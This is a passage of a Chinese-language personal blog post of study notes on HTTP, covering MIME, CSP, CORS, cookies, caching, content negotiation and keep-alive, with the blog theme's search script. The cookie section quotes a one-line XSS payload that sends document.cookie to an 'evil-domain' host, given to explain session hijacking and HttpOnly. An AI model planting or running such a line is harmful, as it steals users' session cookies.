+<li>image/webp    图像</li>
+<li>audio/ogg    音频文件</li>
+<li>video/webm    视频文件</li>
+<li>video/webm    视频文件</li>
+<li>application/octet-stream 二进制数据    </li>
+<li>application/javascript  JavaScript文件或JSONP format</li>
+<li>application/msword  文档类型Microsoft Word        扩展名.doc</li>
+<li>application/vnd.ms-excel   文档类型Microsoft Excel    扩展名.xls    </li>
+<li>application/vnd.openxmlformats-officedocument.spreadsheetml.sheet   文档类型Microsoft Excel (OpenXML)      扩展名.xlsx    </li>
+<li>multipart/form-data   Multipart 类型</li>
+</ul>
+</blockquote>
+<p>MIME 嗅探, 在缺失 MIME 类型或客户端认为文件设置了错误的 MIME 类型时，浏览器可能会通过查看资源来进行MIME嗅探。每一个浏览器在不同的情况下会执行不同的操作。因为这个操作会有一些安全问题，有的 MIME 类型表示可执行内容而有些是不可执行内容。浏览器可以通过请求头 Content-Type 来设置 X-Content-Type-Options: nosniff 以阻止MIME嗅探。假如请求类型为以下两种，那么阻止请求的发生：”style” 但是 MIME 类型不是 “text/css”，”script” 但是 MIME 类型不是JavaScript MIME 类型。</p>
+<h3 id="CSP-Content-Security-Policy-内容安全策略"><a href="#CSP-Content-Security-Policy-内容安全策略" class="headerlink" title="CSP  Content-Security-Policy 内容安全策略"></a>CSP  Content-Security-Policy 内容安全策略</h3><blockquote>
+<p>作用:限制资源获取,报告资源获取越权，减少和报告跨站脚本XSS攻击。CSP通过指定有效域——即浏览器认可的可执行脚本的有效来源——使服务器管理者有能力减少或消除XSS攻击所依赖的载体。一个CSP兼容的浏览器将会仅执行从白名单域获取到的脚本文件，忽略所有的其他脚本 (包括内联脚本和HTML的事件处理属性)；数据包嗅探攻击, 除限制可以加载内容的域，服务器还可指明哪种协议允许使用；比如 (从理想化的安全角度来说)，服务器可指定所有内容必须通过HTTPS加载。</p>
+</blockquote>
+<blockquote>
+<p>限制方式: default-src限制全局;  制定资源类型 connect-src、img-src、font-src、media-src、frame-src、script-src、manifest-src、style-src</p>
+</blockquote>
+<blockquote>
+<p>一个策略由一系列策略指令所组成，每个策略指令都描述了一个针对某个特定类型资源以及生效范围的策略。你的策略应当包含一个default-src策略指令，在其他资源类型没有符合自己的策略时应用该策略(有关完整列表查看default-src )。一个策略可以包含 default-src  或者 script-src 指令来防止内联脚本运行, 并杜绝eval()的使用。 一个策略也可包含一个 default-src 或  style-src 指令去限制来自一个 style 元素或者style属性的內联样式.</p>
+</blockquote>
+<ul>
+<li>Content-Security-Policy: default-src ‘self’: 一个网站管理者想要所有内容均来自站点的同一个源 (不包括其子域名)</li>
+<li>Content-Security-Policy: default-src ‘self’ *.trusted.com: 允许内容来自信任的域名及其子域名 (域名不必须与CSP设置所在的域名相同)</li>
+<li>Content-Security-Policy: default-src ‘self’; img-src *; media-src media1.com media2.com; script-src userscripts.example.com: 允许网页应用的用户在他们自己的内容中包含来自任何源的图片, 但是限制音频或视频需从信任的资源提供者(获得)，所有脚本必须从特定主机服务器获取可信的代码.</li>
+</ul>
+<blockquote>
+<p>对策略进行测试, 为降低部署成本，CSP可以部署为报告(report-only)模式。在此模式下，CSP策略不是强制性的，但是任何违规行为将会报告给一个指定的URI地址。Content-Security-Policy-Report-Only: policy</p>
+</blockquote>
+<blockquote>
+<p>启用违例报告, 默认情况下，违规报告并不会发送。为启用发送违规报告，你需要指定 report-uri 策略指令，并提供至少一个URI地址去递交报告：Content-Security-Policy: default-src ‘self’; report-uri <a href="http://reportcollector.example.com/collector.cgi" target="_blank" rel="noopener">http://reportcollector.example.com/collector.cgi</a></p>
+</blockquote>
+<h3 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h3><blockquote>
+<p>当一个资源从与该资源本身所在的服务器不同的域或端口请求一个资源时，资源会发起一个跨域 HTTP 请求<br>cross-origin sharing standard 跨域资源共享标准， 跨域限制以及预请求验证<br>简单请求,不需要预请求 : 方法 GET HEAD POST; Content-Type:  text/plain、 multipart/form-data、 application/x-www-form-urlencoded; 首部字段集合为Accept 、Accept-Language、Content-Language、Content-Type （需要注意额外的限制）、DPR、Downlink、Save-Data、Viewport-Width、Width。请求中的XMLHttpRequestUpload 对象未注册任意多个事件监听器； 请求中未使用ReadableStream对象。<br>预检请求:必须首先使用OPTIONS方法发起一个预检请求到服务器，以获知服务器是否允许该实际请求。”预检请求“的使用，可以避免跨域请求对服务器的用户数据产生未预期的影响。<br>附带身份凭证的请求:Fetch 与 CORS 可以基于  HTTP cookies 和 HTTP 认证信息发送身份凭证。对于跨域 XMLHttpRequest 或 Fetch 请求，如果要发送凭证信息，需要设置XMLHttpRequest 的 withCredentials为true，从而向服务器发送 Cookies。同时，服务器端的响应中携带 Access-Control-Allow-Credentials: true 。此时，服务器不得设置 Access-Control-Allow-Origin 的值为*。<br>HTTP 请求首部字段,这些首部字段无须手动设置。 当开发者使用 XMLHttpRequest 对象发起跨域请求时，它们已经被设置就绪: Origin, 表明预检请求或实际请求的源站 URI, 它不包含任何路径信息，只是服务器名称; Access-Control-Request-Method; Access-Control-Request-Headers;<br>HTTP 响应首部字段: Access-Control-Allow-Origin; Access-Control-Expose-Headers; Access-Control-Max-Age; Access-Control-Allow-Credentials; Access-Control-Allow-Methods; Access-Control-Allow-Headers。</p>
+</blockquote>
+<h3 id="Cookie-Web-Cookie或浏览器Cookie"><a href="#Cookie-Web-Cookie或浏览器Cookie" class="headerlink" title="Cookie,  Web Cookie或浏览器Cookie"></a>Cookie,  Web Cookie或浏览器Cookie</h3><ul>
+<li>服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie使基于无状态的HTTP协议记录稳定的状态信息成为了可能。</li>
+<li>用途：会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）;个性化设置（如用户自定义设置、主题等）;浏览器行为跟踪.</li>
+<li>分类：会话期Cookie和持久性Cookie。会话期Cookie关闭浏览器会自动删除失效 ；持久性Cookie可以指定一个特定的过期时间（Expires）或有效期（Max-Age。提示：当Cookie的过期时间被设定时，设定的日期和时间只与客户端相关，而不是服务端。<br>response.setHeader(‘Set-Cookie’, [‘name=sea; max-age=2’, ‘year=2018; Expires=Wed, 21 Oct 2015 07:28:00 GMT;HttpOnly; domain=test.com’]);</li>
+<li>标记:  Secure 的Cookie只应通过被HTTPS协议加密过的请求发送给服务端 ;HttpOnly, 为避免跨域脚本 (XSS) 攻击, document.cookie无法访问带有 HttpOnly 标记的Cookie，它们只应该发送给服务端.</li>
+<li>Cookie的作用域: Domain 和 Path 标识定义了Cookie的作用域：即Cookie应该发送给哪些URL。Domain 标识指定了哪些主机可以接受Cookie。如果不指定，默认为当前文档的主机（不包含子域名）。如果指定了Domain，则一般包含子域名；Path 标识指定了主机下的哪些路径可以接受Cookie（该URL路径必须存在于请求URL中），以字符 %x2F (“/“) 作为路径分隔符，子路径也会被匹配。</li>
+<li>SameSite Cookies： 允许服务器要求某个cookie在跨站请求时不会被发送，从而可以阻止跨站请求伪造攻击（CSRF）。但目前SameSite Cookie还处于实验阶段，并不是所有浏览器都支持。</li>
+<li>会话劫持和XSS： 在Web应用中，Cookie常用来标记用户或授权会话。因此，如果Web应用的Cookie被窃取，可能导致授权用户的会话受到攻击。常用的窃取Cookie的方法有利用社会工程学攻击和利用应用程序漏洞进行XSS攻击。(new Image()).src = “<a href="http://www.evil-domain.com/steal-cookie.php?cookie=&quot;" target="_blank" rel="noopener">http://www.evil-domain.com/steal-cookie.php?cookie=&quot;</a> + document.cookie。 HttpOnly类型的Cookie由于阻止了JavaScript对其的访问性而能在一定程度上缓解此类攻击。</li>
+<li>跨站请求伪造（CSRF）: 对用户输入进行过滤来阻止XSS；任何敏感操作都需要确认；用于敏感信息的Cookie只能拥有较短的生命周期。 </li>
+</ul>
+<h3 id="Cache-Control-缓存，-缓解服务器端压力，提升性能"><a href="#Cache-Control-缓存，-缓解服务器端压力，提升性能" class="headerlink" title="Cache-Control 缓存， 缓解服务器端压力，提升性能"></a>Cache-Control 缓存， 缓解服务器端压力，提升性能</h3><blockquote>
+<p>Cache-Control: private 私有缓存, public 公共缓存, no-cache 强制确认缓存, no-store 禁止进行缓存, must-revalidate 缓存验证确认, max-age=31536000 缓存（保持新鲜）的最大时间</p>
+</blockquote>
+<h3 id="数据协商"><a href="#数据协商" class="headerlink" title="数据协商"></a>数据协商</h3><p>客户端发送请求给服务端，客户端会声明请求希望拿到的数据的格式和限制，服务端会根据请求头信息，来决定返回的数据。</p>
+<blockquote>
+<p>请求 Accept </p>
+<ul>
+<li>Accept 声明想要数据的类型;  accept: <em>/</em></li>
+<li>Accept-Encoding 数据编码方式，限制服务端如何进行数据压缩; accept-encoding: gzip, deflate, br。 gzip使用最多；br使用比较少但压缩比高。</li>
+<li>Accept-Language 展示语言;  accept-language: zh-CN,zh;q=0.9,en;q=0.8。 浏览器会判断系统的语言自动加上。q代表权重，数值越大权重越大，优先级越高。</li>
+<li>User-Agent 浏览器相关信息。 user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36。 </li>
+</ul>
+</blockquote>
+<h3 id="Accept"><a href="#Accept" class="headerlink" title="Accept"></a>Accept</h3><blockquote>
+<p>服务端返回Content  </p>
+<ul>
+<li>Content-Type 对应 Accept，从 Accept 中选择数据类型返回;  </li>
+<li>Content-Encoding 对应 Accept-Encoding，声明服务端数据压缩的方式;  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">const zlib = require(&apos;zlib&apos;) // 引入包</span><br><span class="line"></span><br><span class="line">const html = fs.readFileSync(&apos;test.html&apos;) // 这里不加 utf8，加了返回的就是字符串格式了</span><br><span class="line"></span><br><span class="line">response.writeHead(200, &#123;</span><br><span class="line">    &apos;Content-Type&apos;: &apos;text/html&apos;,</span><br><span class="line">    &apos;Content-Encoding&apos;: &apos;gzip&apos;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">response.end(zlib.gzipSync(html))</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</blockquote>
+<ul>
+<li>Content-Language 对应 Accept-Language，是否根据请求返回语言。</li>
+</ul>
+<h3 id="HTTP长连接-Connection"><a href="#HTTP长连接-Connection" class="headerlink" title="HTTP长连接 Connection"></a>HTTP长连接 Connection</h3><blockquote>
+<p>HTTP 的请求是在 TCP 连接的基础上发送的，而 TCP链接分为长连接和短连接 。插件控制台network，name那一行，右键选中 connection ID，代表tcp连接的 id。<br>短连接：若关闭 TCP 连接，下次请求需要重新创建，这时会有网络延迟的开销，好处是每次请求完关闭 TCP 连接，减少客户端和服务端连接的并发数。<br>长连接：HTTP 发送请求时，要先创建一个 TCP 连接，并在 TCP 连接上把 HTTP 请求的内容发送并且接收完返回，这是一次请求完成，浏览器与服务器进行协商是否关闭 TCP 链接，若不关闭 TCP 连接会有一定的消耗，好处是如果还有请求可以直接在这个 TCP 连接上发送，不需要经过创建时三次握手的消耗。<br>默认开启长连接，都是合理利用 Connection:‘keep-alive’，并设置一个自动关闭时间，在服务端进行控制通过设置 ‘Connection’: ‘close’ 来关闭默认的长连接.<br>HTTP 2 信道复用, 在 TCP 连接上可以并发的发送 HTTP 请求，意味着链接网站是只需要一个 TCP 连接。google.com的页面都是用的 HTTP2。它的 connection id 都是一个，注意，同域 id 才相同，不同域需要创建 tcp 连接，这样降低了开销，速度有质的提升。</p>
+</blockquote>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;margin: 50px auto 0;">------------- Article Ends <i class="fa fa-paw"></i> Thanks For Reading -------------</div>
+    
+</div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Http/" rel="tag"># Http</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/01/27/Python/docker/" rel="next" title="docker">
+                <i class="fa fa-chevron-left"></i> docker
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/01/27/CS/Nginx/" rel="prev" title="Nginx">
+                Nginx <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="Supremeyh">
+            
+              <p class="site-author-name" itemprop="name">Supremeyh</p>
+              <p class="site-description motion-element" itemprop="description">Amicus Plato,Amicus Aristotle,Sed Magis Amicus VERITAS.</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">45</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">33</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://twitter.com/Supremeyh_" target="_blank" title="Twitter">
+                      
+                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.instagram.com/" target="_blank" title="Instagram">
+                      
+                        <i class="fa fa-fw fa-instagram"></i>Instagram</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/supremeyh" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://hexo.io/zh-cn/" title="Hexo" target="_blank">Hexo</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://theme-next.iissnan.com/getting-started.html" title="NexT" target="_blank">NexT</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#HTTP"><span class="nav-number">1.</span> <span class="nav-text">HTTP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#工作流程"><span class="nav-number">1.0.1.</span> <span class="nav-text">工作流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#三次握手"><span class="nav-number">1.0.2.</span> <span class="nav-text">三次握手</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#浏览器输入URL后http请求返回的完整过程"><span class="nav-number">1.0.3.</span> <span class="nav-text">浏览器输入URL后http请求返回的完整过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#OSI（Open-System-Interconnect），即开放式系统互联七层模型（一个理想的模型）："><span class="nav-number">1.0.4.</span> <span class="nav-text">OSI（Open System Interconnect），即开放式系统互联七层模型（一个理想的模型）：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TCP-IP五层模型"><span class="nav-number">1.0.5.</span> <span class="nav-text">TCP/IP五层模型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP1-1版本新特性"><span class="nav-number">1.0.6.</span> <span class="nav-text">HTTP1.1版本新特性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#http2与http1-1区别"><span class="nav-number">1.0.7.</span> <span class="nav-text">http2与http1.1区别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#GET方法与POST方法的区别"><span class="nav-number">1.0.8.</span> <span class="nav-text">GET方法与POST方法的区别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常用的HTTP方法有哪些？"><span class="nav-number">1.0.9.</span> <span class="nav-text">常用的HTTP方法有哪些？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#http请求由三部分组成，分别是：请求行、消息报头、请求正文"><span class="nav-number">1.0.10.</span> <span class="nav-text">http请求由三部分组成，分别是：请求行、消息报头、请求正文</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常见HTTP首部字段"><span class="nav-number">1.0.11.</span> <span class="nav-text">常见HTTP首部字段</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#协议升级机制"><span class="nav-number">1.0.12.</span> <span class="nav-text">协议升级机制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常见的HTTP相应状态码"><span class="nav-number">1.0.13.</span> <span class="nav-text">常见的HTTP相应状态码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#URI、URL和URN"><span class="nav-number">1.0.14.</span> <span class="nav-text">URI、URL和URN</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP的缺点与HTTPS"><span class="nav-number">1.0.15.</span> <span class="nav-text">HTTP的缺点与HTTPS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP优化"><span class="nav-number">1.0.16.</span> <span class="nav-text">HTTP优化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#curl-利用URL规则在http命令行下工作的文件传输工具。它支持文件的上传和下载的是综合传输工具，习惯称url为下载工具"><span class="nav-number">1.0.17.</span> <span class="nav-text">curl 利用URL规则在http命令行下工作的文件传输工具。它支持文件的上传和下载的是综合传输工具，习惯称url为下载工具</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTPS"><span class="nav-number">1.0.18.</span> <span class="nav-text">HTTPS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MIME"><span class="nav-number">1.0.19.</span> <span class="nav-text">MIME</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSP-Content-Security-Policy-内容安全策略"><span class="nav-number">1.0.20.</span> <span class="nav-text">CSP  Content-Security-Policy 内容安全策略</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CORS"><span class="nav-number">1.0.21.</span> <span class="nav-text">CORS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Cookie-Web-Cookie或浏览器Cookie"><span class="nav-number">1.0.22.</span> <span class="nav-text">Cookie,  Web Cookie或浏览器Cookie</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Cache-Control-缓存，-缓解服务器端压力，提升性能"><span class="nav-number">1.0.23.</span> <span class="nav-text">Cache-Control 缓存， 缓解服务器端压力，提升性能</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#数据协商"><span class="nav-number">1.0.24.</span> <span class="nav-text">数据协商</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Accept"><span class="nav-number">1.0.25.</span> <span class="nav-text">Accept</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP长连接-Connection"><span class="nav-number">1.0.26.</span> <span class="nav-text">HTTP长连接 Connection</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Supremeyh</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
